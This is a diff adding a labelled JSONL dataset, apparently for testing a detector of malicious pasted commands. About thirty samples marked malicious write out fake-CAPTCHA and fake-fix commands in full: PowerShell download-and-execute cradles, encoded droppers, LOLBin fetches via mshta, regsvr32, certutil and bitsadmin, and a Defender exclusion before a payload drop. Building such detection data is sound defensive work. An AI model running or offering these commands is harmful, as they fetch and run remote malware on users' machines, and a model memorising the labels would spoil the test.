@@ -1,0 +1,67 @@
+{"label":"malicious","text":"powershell -w hidden -c \"iex (irm https://example.com/verify.ps1)\"   # I am not a robot - reCAPTCHA Verification ID: 4821","note":"classic fake CAPTCHA"}
+{"label":"malicious","text":"mshta https://check-human.example.org/captcha.hta # ✅ ''I am not a robot - Cloudflare Verification ID: 7712''","note":"mshta + fake verification comment"}
+{"label":"malicious","text":"mshta.exe http://203.0.113.17/load/x.hta","note":"mshta from raw IP"}
+{"label":"malicious","text":"powershell -NoP -W H -C \"$u='https://dl.example.net/a.ps1';iex(New-Object Net.WebClient).DownloadString($u)\"","note":"DownloadString + iex"}
+{"label":"malicious","text":"powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA1AC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA","note":"encoded download cradle"}
+{"label":"malicious","text":"powershell -ep bypass -e JABwAD0AIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdgBjAC4AZQB4AGUAIgA7AGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQBjAGgAZQBjAGsALgBlAHgAYQBtAHAAbABlAC4AbgBlAHQALwBzAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACQAcAA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAHAAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==","note":"encoded dropper"}
+{"label":"malicious","text":"cmd /c curl -s -o %TEMP%\\upd.exe http://198.51.100.23/upd.exe && %TEMP%\\upd.exe","note":"curl download and run"}
+{"label":"malicious","text":"cmd /c \"curl -k https://update-service.example.org/p.bat | cmd\"  :: Press Enter to complete verification","note":"curl piped to cmd"}
+{"label":"malicious","text":"powershell -c \"iwr https://files.example.com/setup.zip -OutFile $env:APPDATA\\s.zip; Expand-Archive $env:APPDATA\\s.zip $env:APPDATA\\s; Start-Process $env:APPDATA\\s\\run.exe\"","note":"zip drop and run"}
+{"label":"malicious","text":"msiexec /q /i https://msupdate.example.com/kb5034441.msi","note":"silent remote msi"}
+{"label":"malicious","text":"rundll32.exe \\\\203.0.113.9@80\\share\\verify.dll,Entry","note":"webdav dll"}
+{"label":"malicious","text":"regsvr32 /s /n /u /i:http://198.51.100.4/file.sct scrobj.dll","note":"squiblydoo"}
+{"label":"malicious","text":"certutil -urlcache -split -f http://203.0.113.80/a.exe %TEMP%\\a.exe & start %TEMP%\\a.exe","note":"certutil download"}
+{"label":"malicious","text":"bitsadmin /transfer job /download /priority high http://198.51.100.12/svc.exe %APPDATA%\\svc.exe && start %APPDATA%\\svc.exe","note":"bitsadmin download"}
+{"label":"malicious","text":"cmd /c start /min finger verify@203.0.113.55 | cmd","note":"finger LOLBin"}
+{"label":"malicious","text":"conhost.exe --headless powershell -c \"irm https://cdn.example.com/c | iex\"","note":"headless conhost"}
+{"label":"malicious","text":"p^o^w^e^r^s^h^e^l^l -w h -c \"i`e`x (i`w`r 'https://example.net/s' -UseB)\"","note":"caret/backtick obfuscation"}
+{"label":"malicious","text":"powershell -c \"& ('i'+'ex') ((New-Object Net.WebClient).('Down'+'loadString').Invoke('https://198.51.100.70/x'))\"","note":"string concat obfuscation"}
+{"label":"malicious","text":"powershell -w 1 -c \"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGlybSBodHRwczovL2V4YW1wbGUub3JnL3gp'));iex $c\"","note":"FromBase64String + iex"}
+{"label":"malicious","text":"powershell -WindowStyle Hidden -Command \"Start-BitsTransfer -Source https://cdn.example.org/k.exe -Destination $env:TEMP\\k.exe; & $env:TEMP\\k.exe\"","note":"Start-BitsTransfer"}
+{"label":"malicious","text":"wscript.exe //e:jscript \\\\198.51.100.30\\public\\check.js","note":"remote jscript"}
+{"label":"malicious","text":"cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm http://203.0.113.200:8080/stage2 | iex\" & echo Verification complete","note":"cmd wrapper"}
+{"label":"malicious","text":"powershell -c \"Add-MpPreference -ExclusionPath C:\\Users; iwr https://example.org/b.exe -o C:\\Users\\Public\\b.exe; C:\\Users\\Public\\b.exe\"","note":"defender exclusion + drop"}
+{"label":"malicious","text":"SyncAppvPublishingServer.vbs \"n; iex(irm https://update.example.net/a)\"","note":"appv LOLBin"}
+{"label":"malicious","text":"powershell -w h -nop -c \"$r=iwr -UseBasicParsing https://198.51.100.88/cmd.txt; iex $r.Content\"                                                                                # Human verification code: ZX-1192","note":"padded fake comment"}
+{"label":"malicious","text":"cmd /c \"echo Fixing DNS... & powershell -w hidden iex (irm https://dns-fix.example.com/fix)\"","note":"fake fix"}
+{"label":"malicious","text":"pwsh -NoLogo -w hidden -c \"irm https://teams-update.example.com/install.ps1 | iex\" # Microsoft Teams error 0x80070005 fix","note":"fake teams fix"}
+{"label":"malicious","text":"forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c mshta http://203.0.113.33/a.hta\"","note":"forfiles proxy"}
+{"label":"malicious","text":"powershell.exe -c \"$w=New-Object System.Net.WebClient;$w.DownloadFile('http://198.51.100.5/payload.exe','C:\\Users\\Public\\winupd.exe');Start-Process 'C:\\Users\\Public\\winupd.exe'\"","note":"DownloadFile + Start-Process"}
+{"label":"malicious","text":"cmd.exe /c \"curl.exe -sL https://pastebin.example.com/raw/abc123 -o %temp%\\x.ps1 && powershell -ep bypass -f %temp%\\x.ps1\"","note":"paste-site stage"}
+{"label":"benign","text":"winget install --id Git.Git -e --source winget","note":"winget"}
+{"label":"benign","text":"choco install nodejs-lts -y","note":"choco"}
+{"label":"benign","text":"irm get.scoop.sh | iex","note":"official scoop installer (hard case)"}
+{"label":"benign","text":"powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"","note":"official uv installer (hard case)"}
+{"label":"benign","text":"powershell -c \"irm bun.sh/install.ps1|iex\"","note":"official bun installer (hard case)"}
+{"label":"benign","text":"Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))","note":"official chocolatey installer (hard case)"}
+{"label":"benign","text":"irm https://deno.land/install.ps1 | iex","note":"official deno installer (hard case)"}
+{"label":"benign","text":"powershell Get-ExecutionPolicy -List","note":"read policy"}
+{"label":"benign","text":"powershell -Command \"Get-Process | Sort-Object CPU -Descending | Select-Object -First 10\"","note":"process list"}
+{"label":"benign","text":"cmd /c dir /s /b *.log","note":"dir"}
+{"label":"benign","text":"cmd /k ipconfig /all","note":"ipconfig"}
+{"label":"benign","text":"curl -s https://api.github.com/repos/dotnet/runtime/releases/latest","note":"curl json api"}
+{"label":"benign","text":"curl -LO https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_windows_amd64.zip","note":"curl github release"}
+{"label":"benign","text":"Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe -OutFile python-installer.exe","note":"download python installer"}
+{"label":"benign","text":"Start-Process powershell -Verb RunAs","note":"elevated shell"}
+{"label":"benign","text":"Start-Process notepad.exe -ArgumentList 'C:\\Windows\\System32\\drivers\\etc\\hosts'","note":"edit hosts"}
+{"label":"benign","text":"rundll32.exe sysdm.cpl,EditEnvironmentVariables","note":"env vars dialog"}
+{"label":"benign","text":"rundll32 printui.dll,PrintUIEntry /il","note":"add printer"}
+{"label":"benign","text":"regsvr32 /u C:\\Program Files\\Contoso\\OldPlugin.dll","note":"unregister local dll"}
+{"label":"benign","text":"certutil -hashfile PasteGuard.exe SHA256","note":"hash file"}
+{"label":"benign","text":"msiexec /i C:\\Users\\me\\Downloads\\7z2301-x64.msi /qb","note":"local msi"}
+{"label":"benign","text":"cscript C:\\Windows\\System32\\slmgr.vbs /dli","note":"license info"}
+{"label":"benign","text":"powershell -NoProfile -Command \"Get-ChildItem -Recurse -Filter *.tmp | Remove-Item -WhatIf\"","note":"cleanup dry run"}
+{"label":"benign","text":"$bytes = [Convert]::FromBase64String($env:CERT_B64); [IO.File]::WriteAllBytes('cert.pfx', $bytes)","note":"devops decode"}
+{"label":"benign","text":"pwsh -c \"dotnet test --logger trx\"","note":"run tests"}
+{"label":"benign","text":"powershell -c \"Test-NetConnection github.com -Port 443\"","note":"network test"}
+{"label":"benign","text":"wget https://raw.githubusercontent.com/github/gitignore/main/VisualStudio.gitignore -O .gitignore","note":"fetch gitignore"}
+{"label":"benign","text":"Invoke-Expression \"git log --oneline -n 5\"","note":"iex on local command"}
+{"label":"benign","text":"cmd /c \"npm ci && npm run build\"","note":"npm build"}
+{"label":"benign","text":"powershell -w hidden -File C:\\Scripts\\nightly-backup.ps1","note":"scheduled backup"}
+{"label":"benign","text":"Here's how to open PowerShell: press Start, type powershell, and click Run as administrator.","note":"prose mention"}
+{"label":"benign","text":"git commit -m \"Fix login bug\" && git push origin main","note":"git (not gated)"}
+{"label":"benign","text":"npm install --save-dev typescript","note":"npm (not gated)"}
+{"label":"benign","text":"Meeting moved to 3pm tomorrow, room 4B. Bring the Q3 slides.","note":"plain text (not gated)"}
+{"label":"benign","text":"https://github.com/microsoft/winget-cli/releases","note":"url (not gated)"}
+{"label":"benign","text":"sfc /scannow","note":"system file check (not gated)"}
+{"label":"benign","text":"DISM /Online /Cleanup-Image /RestoreHealth","note":"dism (not gated)"}
